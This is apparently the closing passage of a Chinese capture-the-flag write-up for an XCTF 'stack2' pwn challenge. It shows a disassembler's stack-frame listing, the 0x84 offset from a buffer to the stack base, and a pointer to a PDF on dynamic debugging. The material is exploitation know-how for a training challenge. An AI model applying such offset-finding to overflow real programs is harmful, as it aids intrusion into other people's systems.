+<div class="codehilite"><pre><span class="o">-</span><span class="mo">00000070</span> <span class="n">var_70</span>          <span class="n">db</span> <span class="mi">100</span> <span class="n">dup</span><span class="p">(</span><span class="err">?</span><span class="p">)</span>
+<span class="o">-</span><span class="mo">0000000</span><span class="n">C</span> <span class="n">var_C</span>           <span class="n">dd</span> <span class="err">?</span>
+<span class="o">-</span><span class="mo">0000000</span><span class="mi">8</span>                 <span class="n">db</span> <span class="err">?</span> <span class="p">;</span> <span class="n">undefined</span>
+<span class="o">-</span><span class="mo">00000007</span>                 <span class="n">db</span> <span class="err">?</span> <span class="p">;</span> <span class="n">undefined</span>
+<span class="o">-</span><span class="mo">00000006</span>                 <span class="n">db</span> <span class="err">?</span> <span class="p">;</span> <span class="n">undefined</span>
+<span class="o">-</span><span class="mo">00000005</span>                 <span class="n">db</span> <span class="err">?</span> <span class="p">;</span> <span class="n">undefined</span>
+<span class="o">-</span><span class="mo">00000004</span> <span class="n">var_4</span>           <span class="n">dd</span> <span class="err">?</span>
+<span class="o">+</span><span class="mo">00000000</span>  <span class="n">s</span>              <span class="n">db</span> <span class="mi">4</span> <span class="n">dup</span><span class="p">(</span><span class="err">?</span><span class="p">)</span>
+<span class="o">+</span><span class="mo">00000004</span>  <span class="n">r</span>              <span class="n">db</span> <span class="mi">4</span> <span class="n">dup</span><span class="p">(</span><span class="err">?</span><span class="p">)</span>
+<span class="o">+</span><span class="mo">0000000</span><span class="mi">8</span> <span class="n">argc</span>            <span class="n">dd</span> <span class="err">?</span>
+<span class="o">+</span><span class="mo">0000000</span><span class="n">C</span> <span class="n">argv</span>            <span class="n">dd</span> <span class="err">?</span>                    <span class="p">;</span> <span class="n">offset</span>
+<span class="o">+</span><span class="mo">00000010</span> <span class="n">envp</span>            <span class="n">dd</span> <span class="err">?</span>                    <span class="p">;</span> <span class="n">offset</span>
+<span class="o">+</span><span class="mo">00000014</span>
+<span class="o">+</span><span class="mo">00000014</span> <span class="p">;</span> <span class="n">end</span> <span class="n">of</span> <span class="n">stack</span> <span class="n">variables</span>
+</pre></div>
+偏移值是0x84, 即栈底地址.</p>
+<p>动态调试见 xctf_pwn_stack2.pdf。</p></article></body></html>
